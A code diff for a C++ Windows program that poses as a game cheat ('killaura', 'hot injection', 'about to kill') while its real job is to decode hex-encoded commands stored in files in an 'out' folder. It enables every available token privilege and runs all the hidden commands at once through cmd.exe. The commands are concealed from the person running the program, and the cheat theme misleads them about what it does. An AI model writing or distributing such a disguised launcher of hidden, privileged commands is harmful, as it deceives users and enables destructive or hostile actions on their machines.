@@ -9,227 +9,315 @@
 #include <cstring>
 #include <windows.h>
 #include <shellapi.h>
+#include <thread>
+#include <chrono>
 
-// 密码验证
-bool verifyPassword() {
-    const std::string correctPassword = "114514";
-    std::string inputPassword;
-    
-    std::getline(std::cin, inputPassword);
-    
-    return inputPassword == correctPassword;
+using namespace std::chrono_literals;
+
+// 定义RtlGetVersion函数
+typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+
+// 获取Windows Build版本（使用RtlGetVersion）
+std::string getWindowsBuild() {
+	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+	if (hNtdll) {
+		RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
+		if (RtlGetVersion) {
+			RTL_OSVERSIONINFOW osVersion = {0};
+			osVersion.dwOSVersionInfoSize = sizeof(osVersion);
+			if (RtlGetVersion(&osVersion) == 0) { // STATUS_SUCCESS
+				return std::to_string(osVersion.dwBuildNumber);
+			}
+		}
+	}
+	return "未知";
+}
+
+// 密码验证和交互式界面
+bool verifyPasswordWithInteraction() {
+	std::cout << "输入y继续" << std::endl;
+	std::cout << "Type Here: ";
+	
+	std::string inputPassword;
+	std::getline(std::cin, inputPassword);
+	
+	const std::string correctPassword = "y";
+	
+	if (inputPassword != correctPassword) {
+		std::cout << "即将退出！" << std::endl;
+		return false;
+	}
+	
+	// 交互式输出
+	std::cout << "\n验证通过！" << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "正在加载配置..." << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "正在准备脱盒..." << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "正在准备热注入..." << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "已打开：killaura" << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::string build = getWindowsBuild();
+	std::cout << "killaura：检测到敌人 名称 Windows Build :" << build << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "即将kill..." << std::endl;
+	std::this_thread::sleep_for(100ms);
+	
+	std::cout << "\n开始执行命令..." << std::endl;
+	std::this_thread::sleep_for(200ms);
+	
+	return true;
 }
 
 // 从16进制字符串还原为原始字符串
 std::string hexToString(const std::string& hex) {
-    std::string result;
-    
-    if (hex.length() % 2 != 0) {
-        return result;
-    }
-    
-    for (size_t i = 0; i < hex.length(); i += 2) {
-        std::string byteString = hex.substr(i, 2);
-        try {
-            char byte = static_cast<char>(std::stoi(byteString, nullptr, 16));
-            result += byte;
-        } catch (...) {
-            return "";
-        }
-    }
-    
-    return result;
+	std::string result;
+	
+	if (hex.length() % 2 != 0) {
+		return result;
+	}
+	
+	for (size_t i = 0; i < hex.length(); i += 2) {
+		std::string byteString = hex.substr(i, 2);
+		try {
+			char byte = static_cast<char>(std::stoi(byteString, nullptr, 16));
+			result += byte;
+		} catch (...) {
+			return "";
+		}
+	}
+	
+	return result;
 }
 
 // 加载文件
 std::vector<std::string> loadHexFiles(const std::string& directory) {
-    std::vector<std::string> hexContents;
-    std::vector<std::string> filePaths;
-    
-    try {
-        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
-            if (entry.is_regular_file()) {
-                filePaths.push_back(entry.path().string());
-            }
-        }
-        
-        std::sort(filePaths.begin(), filePaths.end());
-        
-        for (const auto& filePath : filePaths) {
-            std::ifstream file(filePath, std::ios::binary);
-            if (file.is_open()) {
-                std::stringstream buffer;
-                buffer << file.rdbuf();
-                hexContents.push_back(buffer.str());
-                file.close();
-            }
-        }
-    } catch (...) {
-        return std::vector<std::string>();
-    }
-    
-    return hexContents;
+	std::vector<std::string> hexContents;
+	std::vector<std::string> filePaths;
+	
+	try {
+		for (const auto& entry : std::filesystem::directory_iterator(directory)) {
+			if (entry.is_regular_file()) {
+				filePaths.push_back(entry.path().string());
+			}
+		}
+		
+		std::sort(filePaths.begin(), filePaths.end());
+		
+		for (const auto& filePath : filePaths) {
+			std::ifstream file(filePath, std::ios::binary);
+			if (file.is_open()) {
+				std::stringstream buffer;
+				buffer << file.rdbuf();
+				hexContents.push_back(buffer.str());
+				file.close();
+			}
+		}
+	} catch (...) {
+		return std::vector<std::string>();
+	}
+	
+	return hexContents;
 }
 
 // 分割命令为单独行
 std::vector<std::string> splitCommandsByLine(const std::string& commandText) {
-    std::vector<std::string> commands;
-    std::stringstream ss(commandText);
-    std::string line;
-    
-    while (std::getline(ss, line)) {
-        line.erase(0, line.find_first_not_of(" \t\r\n"));
-        line.erase(line.find_last_not_of(" \t\r\n") + 1);
-        
-        if (!line.empty() && line[0] != '#') {
-            commands.push_back(line);
-        }
-    }
-    
-    return commands;
+	std::vector<std::string> commands;
+	std::stringstream ss(commandText);
+	std::string line;
+	
+	while (std::getline(ss, line)) {
+		line.erase(0, line.find_first_not_of(" \t\r\n"));
+		line.erase(line.find_last_not_of(" \t\r\n") + 1);
+		
+		if (!line.empty() && line[0] != '#') {
+			commands.push_back(line);
+		}
+	}
+	
+	return commands;
 }
 
-// 使用RtlAdjustPrivilege提权
-bool enableAllPrivilegesNt() {
-    // 定义函数指针类型
-    typedef UINT (WINAPI* typeRtlAdjustPrivilege)(ULONG, BOOL, BOOL, PINT);
-    
-    // 加载ntdll.dll
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) {
-        return false;
-    }
-    
-    // 获取RtlAdjustPrivilege函数地址
-    typeRtlAdjustPrivilege RtlAdjustPrivilege = 
-        (typeRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
-    
-    if (!RtlAdjustPrivilege) {
-        return false;
-    }
-    
-    // 特权常量定义
-    const ULONG privileges[] = {
-        2,   // SE_CREATE_TOKEN_PRIVILEGE
-        3,   // SE_ASSIGNPRIMARYTOKEN_PRIVILEGE  
-        4,   // SE_LOCK_MEMORY_PRIVILEGE
-        5,   // SE_INCREASE_QUOTA_PRIVILEGE
-        6,   // SE_MACHINE_ACCOUNT_PRIVILEGE
-        7,   // SE_TCB_PRIVILEGE
-        8,   // SE_SECURITY_PRIVILEGE
-        9,   // SE_TAKE_OWNERSHIP_PRIVILEGE
-        10,  // SE_LOAD_DRIVER_PRIVILEGE
-        11,  // SE_SYSTEM_PROFILE_PRIVILEGE
-        12,  // SE_SYSTEMTIME_PRIVILEGE
-        13,  // SE_PROF_SINGLE_PROCESS_PRIVILEGE
-        14,  // SE_INC_BASE_PRIORITY_PRIVILEGE
-        15,  // SE_CREATE_PAGEFILE_PRIVILEGE
-        16,  // SE_CREATE_PERMANENT_PRIVILEGE
-        17,  // SE_BACKUP_PRIVILEGE
-        18,  // SE_RESTORE_PRIVILEGE
-        19,  // SE_SHUTDOWN_PRIVILEGE
-        20,  // SE_DEBUG_PRIVILEGE
-        21,  // SE_AUDIT_PRIVILEGE
-        22,  // SE_SYSTEM_ENVIRONMENT_PRIVILEGE
-        23,  // SE_CHANGE_NOTIFY_PRIVILEGE
-        24,  // SE_REMOTE_SHUTDOWN_PRIVILEGE
-        25,  // SE_UNDOCK_PRIVILEGE
-        26,  // SE_SYNC_AGENT_PRIVILEGE
-        27,  // SE_ENABLE_DELEGATION_PRIVILEGE
-        28,  // SE_MANAGE_VOLUME_PRIVILEGE
-        29,  // SE_IMPERSONATE_PRIVILEGE
-        30,  // SE_CREATE_GLOBAL_PRIVILEGE
-        31,  // SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE
-        32,  // SE_RELABEL_PRIVILEGE
-        33,  // SE_INC_WORKING_SET_PRIVILEGE
-        34,  // SE_TIME_ZONE_PRIVILEGE
-        35   // SE_CREATE_SYMBOLIC_LINK_PRIVILEGE
-    };
-    
-    INT previousValue;
-    bool allSuccess = true;
-    
-    // 启用所有特权
-    for (ULONG privilege : privileges) {
-        UINT result = RtlAdjustPrivilege(privilege, TRUE, FALSE, &previousValue);
-        if (result != 0) {
-            allSuccess = false;
-        }
-    }
-    
-    return allSuccess;
+// 获取所有特权
+DWORD GetAllPrivilege(PHANDLE pToken) {
+	DWORD dwErr = 0;
+	
+	if (!pToken) {
+		return ERROR_INVALID_HANDLE;
+	}
+	
+	LPCWSTR lpAllPrivilege[] = {
+		L"SeIncreaseQuotaPrivilege",
+		L"SeSecurityPrivilege",
+		L"SeTakeOwnershipPrivilege",
+		L"SeLoadDriverPrivilege",
+		L"SeSystemProfilePrivilege",
+		L"SeSystemtimePrivilege",
+		L"SeProfileSingleProcessPrivilege",
+		L"SeIncreaseBasePriorityPrivilege",
+		L"SeCreatePagefilePrivilege",
+		L"SeBackupPrivilege",
+		L"SeRestorePrivilege",
+		L"SeShutdownPrivilege",
+		L"SeDebugPrivilege",
+		L"SeSystemEnvironmentPrivilege",
+		L"SeChangeNotifyPrivilege",
+		L"SeRemoteShutdownPrivilege",
+		L"SeUndockPrivilege",
+		L"SeManageVolumePrivilege",
+		L"SeImpersonatePrivilege",
+		L"SeCreateGlobalPrivilege",
+		L"SeIncreaseWorkingSetPrivilege",
+		L"SeTimeZonePrivilege",
+		L"SeCreateSymbolicLinkPrivilege",
+		L"SeSyncAgentPrivilege",
+		L"SeCreatePermanentPrivilege",
+		L"SeTcbPrivilege",
+		L"SeCreateTokenPrivilege",
+		L"SeAssignPrimaryTokenPrivilege",
+		L"SeLockMemoryPrivilege",
+		L"SeMachineAccountPrivilege",
+		L"SeAuditPrivilege",
+		L"SeTrustedCredManAccessPrivilege",
+		L"SeRelabelPrivilege",
+		L"SeEnableDelegationPrivilege",
+	};
+	
+	int privilegeCount = sizeof(lpAllPrivilege) / sizeof(lpAllPrivilege[0]);
+	
+	for (int i = 0; i < privilegeCount; ++i) {
+		LUID Luid;
+		if (LookupPrivilegeValueW(NULL, lpAllPrivilege[i], &Luid)) {
+			TOKEN_PRIVILEGES TokenPrivileges;
+			TokenPrivileges.PrivilegeCount = 1;
+			TokenPrivileges.Privileges[0].Luid = Luid;
+			TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+			
+			if (!AdjustTokenPrivileges(*pToken, FALSE, &TokenPrivileges, 
+									   sizeof(TokenPrivileges), NULL, NULL)) {
+				dwErr = GetLastError();
+				break;
+			}
+		} else {
+			dwErr = GetLastError();
+			break;
+		}
+	}
+	
+	return dwErr;
 }
 
-// 创建系统权限进程
-bool createSystemProcess(const std::string& command) {
-    if (command.empty()) return true;
-
-    // 首先使用RtlAdjustPrivilege提权
-    enableAllPrivilegesNt();
-
-    PROCESS_INFORMATION pi;
-    STARTUPINFOA si;
-    ZeroMemory(&si, sizeof(STARTUPINFOA));
-    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-    
-    si.cb = sizeof(STARTUPINFOA);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
-
-    std::string fullCommand = "cmd.exe /c \"" + command + "\"";
-    char* cmdLine = new char[fullCommand.length() + 1];
-    strcpy(cmdLine, fullCommand.c_str());
-
-    // 尝试以高权限创建进程
-    BOOL success = CreateProcessA(
-        NULL,
-        cmdLine,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
-
-    delete[] cmdLine;
-
-    if (success) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return true;
-    }
-
-    return false;
+// 为当前进程开启所有特权
+bool enableAllPrivilegesForProcess() {
+	HANDLE hToken = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), 
+						  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
+						  &hToken)) {
+		return false;
+	}
+	
+	DWORD result = GetAllPrivilege(&hToken);
+	CloseHandle(hToken);
+	
+	return result == ERROR_SUCCESS;
 }
 
-// 使用ShellExecute以最高权限执行
-bool executeWithMaxPrivilege(const std::string& command) {
-    if (command.empty()) return true;
-
-    std::string fullCommand = "cmd.exe /c \"" + command + "\"";
-
-    SHELLEXECUTEINFOA sei = {0};
-    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
-    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
-    sei.lpFile = "cmd.exe";
-    sei.lpParameters = fullCommand.c_str();
-    sei.nShow = SW_SHOW;
-    sei.lpVerb = "runas";  // 请求管理员权限
-
-    if (ShellExecuteExA(&sei)) {
-        if (sei.hProcess) {
-            CloseHandle(sei.hProcess);
-        }
-        return true;
-    }
-
-    return false;
+// 为单条命令创建进程
+void createProcessForCommand(const std::string& command) {
+	if (command.empty()) return;
+	
+	PROCESS_INFORMATION pi;
+	STARTUPINFOA si;
+	ZeroMemory(&si, sizeof(STARTUPINFOA));
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	
+	si.cb = sizeof(STARTUPINFOA);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	
+	std::string fullCommand = "cmd.exe /c \"" + command + "\"";
+	char* cmdLine = new char[fullCommand.length() + 1];
+	strcpy(cmdLine, fullCommand.c_str());
+	
+	CreateProcessA(
+				   NULL,
+				   cmdLine,
+				   NULL,
+				   NULL,
+				   FALSE,
+				   CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
+				   NULL,
+				   NULL,
+				   &si,
+				   &pi
+				   );
+	
+	delete[] cmdLine;
+	
+	if (pi.hProcess) CloseHandle(pi.hProcess);
+	if (pi.hThread) CloseHandle(pi.hThread);
 }
 
-// 为单条命令创建高权限进程
-void createPrivilegedProcessForCommand(const std::string& command) {
-    // 方法1: 使用RtlAdjustPrivilege提权后创建进程
-    if (createSystem
+// 同时为所有命令创建进程
+void executeAllCommands(const std::vector<std::string>& commands) {
+	// 为当前进程启用所有特权
+	enableAllPrivilegesForProcess();
+	
+	// 为每条命令同时创建进程
+	for (const auto& command : commands) {
+		createProcessForCommand(command);
+	}
+}
+
+int main() {
+	// 密码验证和交互式界面
+	if (!verifyPasswordWithInteraction()) {
+		return 1;
+	}
+	
+	// 检查目录
+	if (!std::filesystem::exists("out")) {
+		return 1;
+	}
+	
+	// 加载文件
+	auto hexBlocks = loadHexFiles("out");
+	if (hexBlocks.empty()) {
+		return 1;
+	}
+	
+	// 合并16进制数据
+	std::string combinedHex;
+	for (const auto& block : hexBlocks) {
+		combinedHex += block;
+	}
+	
+	// 还原命令
+	std::string commandText = hexToString(combinedHex);
+	if (commandText.empty()) {
+		return 1;
+	}
+	
+	// 分割命令
+	auto commands = splitCommandsByLine(commandText);
+	if (commands.empty()) {
+		return 1;
+	}
+	
+	std::this_thread::sleep_for(100ms);
+	
+	// 同时为所有命令创建进程
+	executeAllCommands(commands);
+	
+	std::this_thread::sleep_for(500ms);
+	
+	return 0;
+}
